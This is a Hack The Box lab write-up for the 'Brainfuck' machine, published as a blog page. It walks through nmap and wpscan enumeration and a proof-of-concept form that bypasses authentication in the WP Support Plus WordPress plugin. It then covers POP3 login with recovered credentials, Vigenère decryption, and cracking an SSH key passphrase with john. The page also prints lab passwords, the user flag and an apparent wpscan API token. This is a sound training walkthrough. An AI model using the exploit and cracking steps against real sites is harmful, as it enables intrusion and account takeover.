<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>HTB_Brainfuck | HackThe4O4</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Brainfuck IP 10.129.228.97  tun0 10.10.16.11  nmap -sV -sC -A -T4 -Pn 10.129.228.97     nmap -p 1-65535 -T4 -A -v 10.129.228.97    find port Discovered open port 443&#x2F;tcp on 10.129.228.97Discovered ope">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB_Brainfuck">
<meta property="og:url" content="https://no-flag.com/2024/12/21/Brainfuck/index.html">
<meta property="og:site_name" content="HackThe4O4">
<meta property="og:description" content="Brainfuck IP 10.129.228.97  tun0 10.10.16.11  nmap -sV -sC -A -T4 -Pn 10.129.228.97     nmap -p 1-65535 -T4 -A -v 10.129.228.97    find port Discovered open port 443&#x2F;tcp on 10.129.228.97Discovered ope">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_1.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_2.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_3.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_4.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_5.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_6.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_7.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_8.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_9.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_10.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_11.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_12.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_13.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_14.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_15.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_16.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_17.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_18.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_19.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_20.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_21.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_22.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_23.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_24.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_25.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_26.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_27.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_28.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_29.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_30.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_31.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_32.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_33.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_34.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_35.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_36.png">
<meta property="og:image" content="https://no-flag.com/img/Brainfuck_Untitled_37.png">
<meta property="article:published_time" content="2024-12-21T12:32:07.076Z">
<meta property="article:modified_time" content="2024-03-02T09:40:30.710Z">
<meta property="article:author" content="Noflag">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://no-flag.com/img/Brainfuck_Untitled.png">
  
    <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/cat.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  


<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="/img/mela.gif" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/2024/12/21/hello-world/">About Me</a></li>
				        
							<li><a href="/archives">All articles</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/mela.gif" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/2024/12/21/hello-world/">About Me</a></li>
		        
					<li><a href="/archives">All articles</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="Brainfuck-Brainfuck" class="article article-type-Brainfuck" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Brainfuck/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.076Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      HTB_Brainfuck
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h1><ul>
<li><p>IP 10.129.228.97</p>
</li>
<li><p>tun0 10.10.16.11</p>
</li>
<li><p>nmap -sV -sC -A -T4 -Pn 10.129.228.97</p>
</li>
</ul>
<p><img src="/img/Brainfuck_Untitled.png" alt="Untitled"></p>
<ul>
<li>nmap -p 1-65535 -T4 -A -v 10.129.228.97</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_1.png" alt="Untitled"></p>
<p><img src="/img/Brainfuck_Untitled_2.png" alt="Untitled"></p>
<p>find port</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Discovered open port 443/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 22/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 143/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 25/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 110/tcp on 10.129.228.97</span><br></pre></td></tr></table></figure>

<p>Because it is found that there is an nginx service that opens 443, so open the default webpage to confirm,SO..When we visit the localhost default web page</p>
<p><img src="/img/Brainfuck_Untitled_3.png" alt="Untitled"></p>
<p>Notice here that there are three domain names</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)</span><br><span class="line">| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span><br><span class="line">| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb</span><br><span class="line">| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>sup3rs3cr3t.brainfuck.htb</strong></li>
<li><strong><a target="_blank" rel="noopener" href="http://www.brainfuck.htb/">www.brainfuck.htb</a></strong></li>
<li><strong>brainfuck.htb</strong></li>
</ul>
<p>now write &#x2F;etc&#x2F;hosts Add three domains to this file</p>
<p><img src="/img/Brainfuck_Untitled_4.png" alt="Untitled"></p>
<p>when I browse <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https:&#x2F;&#x2F;**brainfuck.htb</a>** website,The webpage directly indicates that he is a wordpress website, and pointing to the SMTP mail ID <a href="mailto:&#111;&#114;&#101;&#x73;&#116;&#105;&#115;&#x40;&#98;&#x72;&#x61;&#x69;&#110;&#102;&#117;&#x63;&#x6b;&#46;&#104;&#x74;&#98;">&#111;&#114;&#101;&#x73;&#116;&#105;&#115;&#x40;&#98;&#x72;&#x61;&#x69;&#110;&#102;&#117;&#x63;&#x6b;&#46;&#104;&#x74;&#98;</a></p>
<p><img src="/img/Brainfuck_Untitled_5.png" alt="Untitled"></p>
<p>Check whether there are any types of vulnerable themes, plug-ins, user names, etc.</p>
<ul>
<li>Web Application Analysis (wpscan - WordPress vulnerability scanner)</li>
</ul>
<p>不管透過官方平台或是自己架設的WordPress網站，就都是這次介紹的工具<code>wpscan</code><br>鎖定的目標了，它位於Kali的<strong>Web Application Analysis</strong>分類之中，直接執行可以看到介紹與基本用法</p>
<p><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10274253">Day 14 網頁分析 - Web Application Analysis (wpscan - WordPress vulnerability scanner) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>
<p><code>WPScan</code> 是一個掃描 <code>WordPress</code> 漏洞的黑盒子掃描器，它可以為所有 <code>Web</code> 開發人員掃描 <code>WordPress</code><br> 漏洞並在他們開發前找到並解決問題。</p>
<p>通過外掛,主題的漏洞去滲透 <code>Wordpress</code> 站點，於是 <code>WPScan</code> 應運而生，收集 <code>Wordpress</code> 的各種漏洞，形成一個 <code>Wordpress</code> 專用掃描器。</p>
<p>該掃描器可以實現獲取站點使用者名稱，獲取安裝的所有外掛、主題，以及存在漏洞的外掛、主題，並提供漏洞資訊。同時還可以實現對未加防護的</p>
<p><a target="_blank" rel="noopener" href="https://www.itread01.com/hkyxlhk.html"></a></p>
<p><a target="_blank" rel="noopener" href="https://blog.wpscan.com/wpscan-user-documentation/">WPScan User Documentation - WPScan WordPress Security</a></p>
<p><a target="_blank" rel="noopener" href="https://vk9-sec.com/how-to-use-wpscan/">How to use WPScan | VK9 Security</a></p>
<ul>
<li><p>wpscan –url <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https://brainfuck.htb/</a> –disable-tls-checks –api-token “hrq4GRSi8E4gndSKawwwmLVImT3xWzlRSE7osdZsBF8”</p>
</li>
<li><p><strong>The following enumeration options exist:</strong></p>
<p>  <strong><code>vp</code> (Vulnerable plugins)</strong></p>
<p>  <strong><code>ap</code> (All plugins)</strong></p>
<p>  <strong><code>p</code> (Popular plugins)</strong></p>
<p>  <strong><code>vt</code> (Vulnerable themes)</strong></p>
<p>  <strong><code>at</code> (All themes)</strong></p>
<p>  <strong><code>t</code> (Popular themes)</strong></p>
<p>  <strong><code>tt</code> (Timthumbs)</strong></p>
<p>  <strong><code>cb</code> (Config backups)</strong></p>
<p>  <strong><code>dbe</code> (Db exports)</strong></p>
<p>  <strong><code>u</code> (User IDs range. e.g: u1-5)</strong></p>
<p>  <strong><code>m</code> (Media IDs range. e.g m1-15)</strong></p>
</li>
</ul>
<p>Before start, need to get API, if I not get this API, when I execute the commend, something results can’t appears</p>
<p><img src="/img/Brainfuck_Untitled_6.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wp-support-plus-responsive-ticket-system</span><br><span class="line"> | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/</span><br><span class="line"> | Last Updated: 2019-09-03T07:57:00.000Z</span><br><span class="line"> | [!] The version is out of <span class="built_in">date</span>, the latest version is 9.1.2</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 6 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 – Authenticated SQL Injection</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/f267d78f-f1e1-4210-92e4-39cce2872757</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/40939/</span><br><span class="line"> |      - https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution (RCE)</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.8</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 9.0.3 - Multiple Authenticated SQL Injection</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 9.0.3</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/cbbdb469-7321-44e4-a83b-cac82b116f20</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131</span><br><span class="line"> |      - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 9.1.2 - Stored XSS</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 9.1.2</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/e406c3e8-1fab-41fd-845a-104467b0ded4</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7299</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15331</span><br><span class="line"> |      - https://cert.kalasag.com.ph/news/research/cve-2019-7299-stored-xss-in-wp-support-plus-responsive-ticket-system/</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/2024484/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 - Privilege Escalation</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f</span><br><span class="line"> |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html</span><br><span class="line"> |      - https://packetstormsecurity.com/files/140413/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.8</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1763596</span><br><span class="line"> |</span><br><span class="line"> | Version: 7.1.3 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>Version 7.1.3 wp-support-plus-responsive-ticket-system</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41006"></a></p>
<p>when I browse exploit.db I find this vuln, maybe can use it</p>
<p>According to an exploit that is used incorrectly, wp_set_auth_cookie can log in without a password.</p>
<p>POC:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://wp/wp-admin/admin-ajax.php&quot;</span>&gt;</span></span><br><span class="line">	Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;administrator&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sth&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;loginGuestFacebook&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>So use this POC, need to change some place </p>
<ul>
<li><p>vim exploitpoc.html</p>
<p>  <img src="/img/Brainfuck_Untitled_7.png" alt="Untitled"></p>
</li>
</ul>
<p>Browse to the exploitpoc.html file on the localhost server as shown below and click the Login tab.</p>
<p><img src="/img/Brainfuck_Untitled_8.png" alt="Untitled"></p>
<p>Run a Python script for file transfer over port 80.</p>
<ul>
<li>python -m http.server 80</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_9.png" alt="Untitled"></p>
<p>when I click the login I well reach this page</p>
<p><img src="/img/Brainfuck_Untitled_10.png" alt="Untitled"></p>
<p>Reorganize <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https://brainfuck.htb/</a> this page</p>
<p><img src="/img/Brainfuck_Untitled_11.png" alt="Untitled"></p>
<p> log in as anyone without knowing the password due to misuse of wp_set_auth_cookie(). Then you can visit <a target="_blank" rel="noopener" href="https://brainfuck/">https://brainfuck</a> again to enter the admin panel.</p>
<p><img src="/img/Brainfuck_Untitled_12.png" alt="Untitled"></p>
<p>There is account information under the SMTP plugin, but the password is not displayed, so use F12 to view the information</p>
<ul>
<li>user: orestis</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_13.png" alt="Untitled"></p>
<ul>
<li>password:kHGuERB29DNiNE</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_14.png" alt="Untitled"></p>
<ul>
<li><p>Telnet</p>
<ul>
<li>通訊協議</li>
<li>遠端登入工具</li>
<li>可以檢視埠是否可訪問</li>
<li>TCP&#x2F;IP協議家族中的一員</li>
<li>提供在本地計算機上完成遠端主機工作的能力</li>
<li>使用者使用telnet程式連線到伺服器</li>
<li>輸入命令在伺服器上執行</li>
<li>常用於遠端控制Web伺服器</li>
</ul>
</li>
<li><p>SMTP (簡易郵件傳輸通訊協定)</p>
<ul>
<li>透過網路傳輸的技術標準</li>
<li>允許電腦和伺服器交換資料</li>
<li>標準化了電子郵件從寄件人到收件人的傳輸方式</li>
<li>郵件傳遞通訊協定</li>
<li>不是郵件擷取通訊協定</li>
</ul>
</li>
</ul>
<p>Through the telnet command: <strong>telnet 10.10.10.17 110</strong>, establish a connection with the SMTP server and log in to the orestis account</p>
<ul>
<li>POP3 - TCP 110 &#x2F; POP3 protocol uses this port (unencrypted)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The mail client is used to collect mail from the server. </span><br><span class="line">Security Question: **Reusable clear text passwords.** </span><br><span class="line">– Connections and attempts are not audited and therefore subject to grinding. </span><br><span class="line">– Some POP3 server versions have buffer overflow issues.</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.auditmypc.com/tcp-port-110.asp">TCP 110 - Port Protocol Information and Warning!</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)</span><br><span class="line">|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)</span><br><span class="line">|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)</span><br><span class="line">25/tcp  open  smtp?</span><br><span class="line">|_smtp-commands: Couldn&#x27;t establish connection on port 25</span><br><span class="line">110/tcp open  pop3     Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: TOP UIDL PIPELINING CAPA SASL(PLAIN) USER RESP-CODES AUTH-RESP-CODE</span><br><span class="line">143/tcp open  imap     Dovecot imapd</span><br><span class="line">|_imap-capabilities: listed have more ID OK LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 post-login SASL-IR IDLE capabilities LITERAL+ ENABLE IMAP4rev1</span><br><span class="line">443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span><br><span class="line">| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb</span><br><span class="line">| Not valid before: 2017-04-13T11:19:29</span><br><span class="line">|_Not valid after:  2027-04-11T11:19:29</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: nginx/1.10.0 (Ubuntu)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://kb.website-solution.net/%E5%A6%82%E4%BD%95%E9%80%8F%E9%81%8E-telnet-%E6%A8%A1%E5%BC%8F%E6%B8%AC%E8%A9%A6-pop3-%E9%9B%BB%E9%83%B5/">如何透過 Telnet 模式測試 POP3 電郵? - 卓智互聯網 網頁寄存 知識庫</a></p>
<p><img src="/img/Brainfuck_Untitled_15.png" alt="Untitled"></p>
<ul>
<li>LIST ⇒ Displays the archive directory.</li>
<li>retr 1 ⇒ FTP Client 向 Server 複製一個檔案，也就是由 Server 端下載一個檔案到 Client 端</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_16.png" alt="Untitled"></p>
<ul>
<li>retr 2</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_17.png" alt="Untitled"></p>
<p>I think…I find the important Information</p>
<p>Any “secret” has a user name and password to log in</p>
<p>I realized that this credential can be connected to the <strong>sup3rs3cr3t.Brainfuck</strong> I explored in my web browser htb 。</p>
<ul>
<li>username: orestis</li>
<li>password: kIEnnfEKJ#9UmdO</li>
</ul>
<p>when I try to browse this page, and log in</p>
<p><img src="/img/Brainfuck_Untitled_18.png" alt="Untitled"></p>
<p>log in access, see the Super Secret Forum</p>
<p><img src="/img/Brainfuck_Untitled_19.png" alt="Untitled"></p>
<p>into the key I see that ..I noticed the chat between admin and orestis. It looks like maybe orestis and the admin shared some confidential information in this chat, but in the admin’s last reply, it looks like he’s secretly sharing any encrypted URLs</p>
<p><img src="/img/Brainfuck_Untitled_20.png" alt="Untitled"></p>
<p>Because I’m not sure what the content here is, I decided to check the content of SSH Access page</p>
<p>Password login is permanently disabled. so..user want to find the key to unlock </p>
<p><img src="/img/Brainfuck_Untitled_21.png" alt="Untitled"></p>
<p>Ortis lost the SSH login key and asked the administrator to send the key privately</p>
<p>It seems that some rules have been found, and maybe they can decrypt other content along the way.</p>
<p><img src="/img/Brainfuck_Untitled_22.png" alt="Untitled"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Qbqquzs - Pnhekxs dpi fca fhf zdmgzt</span><br><span class="line">Orestis - Hacking for fun and profit</span><br><span class="line">##change..</span><br><span class="line">QbqquzsPnhekxsdpifcafhfzdmgzt</span><br><span class="line">OrestisHackingforfunandprofit</span><br></pre></td></tr></table></figure>

<p><img src="/img/Brainfuck_Untitled_23.png" alt="Untitled"></p>
<p>I guess mnvze:&#x2F;&#x2F;10.10.10.17&#x2F;8zb5ra10m915218697q1h658wfoq0zc8&#x2F;frmfycu&#x2F;sp_ptr</p>
<ul>
<li>mnvze:&#x2F;&#x2F; maybe is https:&#x2F;&#x2F;</li>
</ul>
<p>I had pasted above ciphertext inside encipher textbox and decryption key inside decipher textbox and received <strong>decipher message</strong> “CkmybraInfuckmybrainfuckmybra”</p>
<p><a target="_blank" rel="noopener" href="https://rumkin.com/tools/cipher/vigenere/#">Vigenère</a></p>
<p><img src="/img/Brainfuck_Untitled_24.png" alt="Untitled"></p>
<ul>
<li>key ⇒ fuckmybrain</li>
</ul>
<p>In the key chat room screen, admin provides a ciphertext URL to download id_rsa for ssh login as orestis</p>
<ul>
<li>mnvze:&#x2F;&#x2F;zsrivszwm.rfz&#x2F;8cr5ai10r915218697i1w658enqc0cs8&#x2F;ozrxnkc&#x2F;ub_sja</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_25.png" alt="Untitled"></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa">https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</a></li>
</ul>
<p><img src="/img/Brainfuck_Untitled_26.png" alt="Untitled"></p>
<p>when I download it, the file need enter the passwd</p>
<p><img src="/img/Brainfuck_Untitled_27.png" alt="Untitled"></p>
<ul>
<li>python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; john.priv</li>
<li>john –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt john.priv</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.kali.org/tools/john/">john | Kali Linux Tools</a></p>
<p><img src="/img/Brainfuck_Untitled_28.png" alt="Untitled"></p>
<h1 id="ssh2johnn-Lxd-權限提升"><a href="#ssh2johnn-Lxd-權限提升" class="headerlink" title="ssh2johnn &amp;&amp; Lxd 權限提升"></a>ssh2johnn &amp;&amp; Lxd 權限提升</h1><p><strong>Ssh2john 是 John The Reaper 套件的一部分。這是一個腳本，它基本上將 [RSA&#x2F;DSA&#x2F;EC&#x2F;OPENSSH (SSH private keys) ] 私鑰轉換為 john 格式，以便以後使用 JtR 進行破解</strong></p>
<p><a target="_blank" rel="noopener" href="https://vk9-sec.com/ssh2john-how-to/">Ssh2john how to | VK9 Security</a></p>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/lxd-privilege-escalation/">Lxd Privilege Escalation - Hacking Articles</a></p>
<p>**Linux Container (LXC)**通常被認為是一種輕量級虛擬化技術，介於 chroot 和完全開發的虛擬機之間，它創建了一個盡可能接近 Linux 安裝的環境，但不需要單獨的內核。</p>
<p>**Linux 守護進程 (LXD)**是輕量級管理程序或輕量級容器管理程序。LXD 建立在 Docker 之前使用的稱為 LXC 的容器技術之上。它使用穩定的 LXC API 在後台完成所有容器管理，在頂部添加 REST API 並提供更簡單、更一致的用戶體驗。</p>
<p>get this passwd,and login the SSH</p>
<ul>
<li>3poulakia!</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_29.png" alt="Untitled"></p>
<p>Now find user.txt and root.txt</p>
<ul>
<li>cat user.txt ⇒ 646ab926895979b1bbf5f76571fcc2b9</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_30.png" alt="Untitled"></p>
<p>The encrypt.sage has write the debuge.txt and output.txt</p>
<p><img src="/img/Brainfuck_Untitled_31.png" alt="Untitled"></p>
<ul>
<li>debug.txt</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span><br><span class="line">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span><br><span class="line">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span><br></pre></td></tr></table></figure>

<ul>
<li>cat output.txt</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span><br></pre></td></tr></table></figure>

